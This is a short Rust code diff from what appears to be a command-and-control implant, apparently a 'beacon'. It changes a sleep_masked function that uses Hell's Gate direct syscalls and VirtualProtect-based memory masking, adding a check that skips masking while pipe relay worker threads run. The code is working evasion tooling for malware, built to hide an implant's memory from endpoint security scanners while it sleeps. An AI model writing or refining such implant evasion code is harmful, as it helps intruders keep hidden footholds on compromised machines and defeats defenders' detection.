@@ -113,6 +113,13 @@ pub fn sleep_masked(ms: u64) {
     let ssn = crate::hells_gate::delay_ssn();
     let mut interval: i64 = -(ms as i64 * 10_000); // negative = relative 100ns units
 
+    // The pipe relay has worker threads that continue running while the beacon
+    // sleeps. Do not mask process data while those workers may read it.
+    if crate::commands::pipe_server_active() {
+        unsafe { do_nt_delay(ssn, &mut interval); }
+        return;
+    }
+
     unsafe {
         use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
         use windows_sys::Win32::System::Memory::VirtualProtect;
